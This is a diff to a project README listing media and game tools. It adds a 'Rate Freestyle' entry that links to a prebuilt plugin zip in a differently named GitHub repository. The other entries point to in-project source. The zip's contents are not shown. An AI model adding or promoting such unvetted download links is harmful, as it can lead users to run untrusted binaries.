@@ -167,5 +167,6 @@ Many entries were discovered through [FMHY](https://fmhy.net/). The [catalog](ca
 I made these workflows. [Windows setup](docs/SETUP.md)
 
 - **[Freestyle editor](docs/FREESTYLE.md)** — Review passages from a recording, adjust clip boundaries, create captions, and export approved cuts. [Source](scripts/media.py)
+- **[Rate Freestyle](docs/RATE-FREESTYLE.md)** — Score lyrical complexity, depth, and how ideas build across a passage. Compare performances using timed excerpts. [Download plugin](https://raw.githubusercontent.com/yandleyick/candlestick-creator-toolkit/main/downloads/rate-freestyle-plugin.zip)
 - **[Overwatch scanner](docs/OVERWATCH.md)** — Reads the kill feed and groups possible Tracer final blows from the same life for review. [Source](scripts/overwatch)
 - **[Restoration workflow](docs/RESTORATION.md)** — Recovers fine brightness detail in 8-bit and 16-bit PNG frames while preserving their dimensions and bit depth. [Source](scripts/restore_frames.py)
